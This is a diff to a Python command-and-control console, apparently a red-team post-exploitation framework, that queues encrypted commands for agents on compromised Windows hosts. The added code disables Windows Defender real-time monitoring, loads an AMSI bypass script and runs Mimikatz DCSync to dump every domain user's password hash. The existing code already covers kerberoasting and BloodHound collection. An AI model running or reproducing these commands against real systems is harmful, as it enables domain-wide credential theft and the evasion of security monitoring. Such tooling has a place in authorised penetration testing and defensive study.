@@ -19,16 +19,19 @@ class cmd:
      'payload',
      'modules',
      'encode64',
+     'drm',
      'DA',
      'downloads',
      'kerb',
      'dcsync_admins',
      'dcsync_list',
+     'dcsync_all',
      'kill_all',
      'delete_all',
      'get_groups',
      'get_users',
-     'bloodhound']
+     'bloodhound',
+     'dis_amsi']
 
     HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
      ['list', 'List all agents'],
@@ -47,10 +50,12 @@ class cmd:
      ['upload', 'upload files to the victim'],
      ['modules', 'list all the Available modules in Modules directory'],
      ['encode64', 'encode any command to base64 encoded UTF-8 command ( can be decoded in powershell)'],
+     ['drm', 'disable windows realtime monitoring - require admin privileges'],
      ['screenshot', 'take screenshot form  the victim'],
      ['DA', 'Run defense Analysis Module'],
      ['kerb', 'do kerberoast attack  and dump  service accounts hashes'],
-     ['dcsync_admins', 'do dcsync attack agains domain admins group'],
+     ['dcsync_all', 'do dcsync attack and get all users hashes'],
+     ['dcsync_admins', 'do dcsync attack agains admin users'],
      ['dcsync_list', 'do dcsync attack agains custom user list '],
      ['get_groups', 'get all the groups user is member of'],
      ['get_users', 'get all the users member in group'],
@@ -198,7 +203,7 @@ class cmd:
         if config.get_pointer()=='main':
             print "you can't use this command in main ! chose an agent"
             return
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
+        #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load DA.ps1"))
 
@@ -206,7 +211,7 @@ class cmd:
         if config.get_pointer()=='main':
             print "you can't use this command in main ! chose an agent"
             return
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
+        #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Find-PSServiceAccounts.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Kerberoast.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load kerb.ps1"))
@@ -218,6 +223,14 @@ class cmd:
         print "grab some coffe this may take too long to finish if the domain admin users are more than 10"
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""$users=(Get-ADGroupMember -Identity "Domain Admins").SamAccountName;For ($i=0; $i -le $users.Length; $i=$i+5) {echo $users[$i..($i+4)] | ForEach-Object  { $t='"lsadump::dcsync /user:rep"';$t=$t.replace("rep",$_);Invoke-Mimikatz -Command $t}}"""))
+
+    def dcsync_all(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""Invoke-Mimikatz -Command '"lsadump::dcsync /domain:{domain} /all /csv"'""".replace("{domain}",config.AGENTS[config.get_pointer()][6])))
+
 
     def dcsync_list(self, args=None):
         if config.get_pointer()=='main':
@@ -278,3 +291,15 @@ class cmd:
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load SharpHound.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -ZipFileName "+"".join([random.choice(string.ascii_uppercase) for i in range(5)])))
+
+    def drm(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Set-MpPreference -DisableRealtimeMonitoring 1"))
+
+    def dis_amsi(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
